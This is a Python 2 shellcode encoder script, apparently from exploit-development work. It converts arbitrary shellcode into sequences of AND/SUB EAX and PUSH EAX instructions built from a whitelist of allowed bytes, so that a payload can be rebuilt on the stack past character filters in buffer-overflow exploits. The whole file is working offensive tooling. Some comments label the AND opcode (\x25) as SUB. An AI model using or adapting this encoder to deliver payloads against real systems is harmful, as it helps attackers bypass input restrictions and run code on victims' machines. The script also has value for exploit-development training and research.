#!/usr/bin/python
#
# The following Python code will take shellcode (buf variable) 
# and create SUB instructions that will generate shellcode four
# bytes at a time and push them to the stack.
# 
# The trick with this code is that EAX needs to be zeroed out before
# each new set of SUB instructions. Also, the stack needs to be
# aligned to be where you can execute the pushed instructions. All of
# this is left to the reader.
#
# Author: Absane (blog.noobroot.comu)
# Modified by: Alton Johnson (alton.jx@gmail.com)
#
# Last Updated: March 12, 2015 (by Alton Johnson)
#

import sys, os, getopt
from random import choice
from sys import argv

total_length = 0
### CHARACTERS THAT ARE ALLOWED ###

code = ''
goodchars = []

def compl(hexvalue):
    return int("FFFFFFFF",16) - int(hexvalue,16)+1

def findvalues(code, carry, last):
    total = 9999999999
    wastetime = 99999
    while (total != int(code,16)):  
        a = choice(goodchars)
        b = choice(goodchars)
        c = choice(goodchars)
        total = int(a,16) + int(b,16) + int(c,16)+carry
        if (( total - 256 == int(code,16) ) and (last != 1) & wastetime < 1):
            return (a,b,c,1)
        wastetime += -1
    return (a,b,c,0)

def encode(x):
    global code,total_length
    y = x
    endian  = (y[6] + y[7]) + (y[4] + y[5]) + (y[2] + y[3]) + (y[0] + y[1])
    twocompl = compl(endian)
    k = str(hex(twocompl))[2:99].strip("L")
    k = "0" * ( 8 - len(k) ) + k

    first = k[0:2]
    second= k[2:4]
    third = k[4:6]
    fourth= k[6:8]

    a = findvalues(fourth,0,0)
    b = findvalues(third,a[3],0)
    c = findvalues(second,b[3],0)
    d = findvalues(first,c[3],1)

    output = ''
    final  = ''
    plain = []
    for i in range(0,3):
        for k in (a,b,c,d):
            output += "\\x" + k[i]
            plain.append(k[i])
        final += '\n\"\\x2d' + output + "\""
        total_length += (len(output)/4+1)
        final += "\t# SUB EAX," + plain[3] + plain[2] + plain[1] + plain[0]
        output = ''
        plain = []

    code += "\n# Encoded: " + x
    code += "\n\"" + r"\x25\x41\x41\x41\x41" + "\"\t# SUB EAX,41414141"
    code += "\n\"" + r"\x25\x3E\x3E\x3E\x3E" + "\"\t# SUB EAX,3E3E3E3E"
    code += final
    code += "\n\"" + r"\x50" + "\"\t\t\t# PUSH EAX\n"
    total_length += 11

def main(shell):
    global total_length
    k = shell
    while ( len(k)/2 % 4 != 0):
        k += '90'
        total_length += 1
  
    z = ''
    line = ''
    rshell = []  
    for i in range(0, len(k), 8):
        for j in range(0,8):
            z += k[i + j]
        line = z + line
        rshell = [line] + rshell      
        line = ''
        z    = ''
    for i in rshell:
        encode(i)

def help():
  print "\n Usage: %s <OPTIONS>" % argv[0]
  print "\n -s <string>\tEncode bytes from stdin (\\x00 format)."
  print " -f <file>\tEncodes shellcode from a file (\\x00 format)."
  print " -g <file>\tOptional parameter that restricts encoder to goodbytes.  (\\x00 format)."
  print "\n Usage example: %s -s \"\\x75\\xE7\\xFF\\xE7\"t" % argv[0]
  print " Usage example: %s -f shellcode.txt -g good_chars.txt\n" % argv[0]
  exit()

def start(argv):
  global code
  global goodchars
  if len(argv) < 1:
    help()
  try:
    opts, args = getopt.getopt(argv, "f:s:g:")
  except getopt.GetoptError, err:
    print "\n Error: %s" % err
    help()

  for opt, arg in opts:
    if opt == "-s":
      buf = arg
      buf = buf.replace("\\x","").replace("x","")
    elif opt == "-g":
      good_file = open(arg).read().replace("\n", "").replace("\\x", "").replace("\"", "")
      goodchars = [good_file[i:i+2] for i in range(0, len(good_file), 2)][:-1]
    elif opt == "-f":
      try:
        buf = open(arg).read().replace("\\x","").replace("\n","").replace("\"","")
      except Exception, err:
        print "\n Error: %s" % err
        exit()
  
  main(buf)
  code = code[:-1]
  print "\nencoded_shellcode = (", code + "\n)"

if __name__ == "__main__":
  try:
    start(argv[1:])
    print "\nTotal length in bytes: " + str(total_length) + "\n"
  except Exception, err:
    print "\n Error: %s" % err
  except KeyboardInterrupt:
    print "\nExiting per user's request (ctrl-c)"
    exit()
